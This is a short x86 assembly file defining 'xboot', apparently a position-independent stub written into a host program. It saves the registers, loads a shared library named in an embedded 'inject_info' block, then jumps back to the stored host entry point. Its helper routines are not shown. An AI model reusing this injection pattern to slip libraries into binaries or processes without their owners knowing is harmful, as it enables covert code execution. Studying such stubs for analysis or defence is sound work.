

.section .text

#-------inject info section
inject_info_start:

info_size: .int inject_info_end - inject_info_start
host: .int 0x0 
lib_name: .fill 256,1,0
start_up: .fill 10,1,0

inject_info_end:		  

.global xboot
xboot:
	#back up context
	push %esp
	push %eax
	push %ebx
	push %ecx
	push %edx
	push %ebp
	push %esi
	
	jmp boot_start

#-------data section


#------data section end

boot_start:	

	call show_info

    call n1
n1: pop %eax
    sub $(n1 - lib_name),%eax
    call n3
n3: pop %ebx
    sub $(n3 - start_up),%ebx
    push %ebx
    push %eax
    call load_lib
    add $8,%esp
    cmp $0,%eax
    jne exit_execption

exit_boot:
	
	call n2
n2: pop %edi
	sub $(n2 - host),%edi
	mov (%edi),%eax
	cmp $0,%eax
	je exit_execption

	pop %esi
	pop %ebp
	pop %edx
	pop %ecx
	pop %ebx
	pop %eax
	pop %esp
	jmp *(%edi)

exit_execption:
    mov $1,%eax
    mov $-1,%ebx
    int $0x80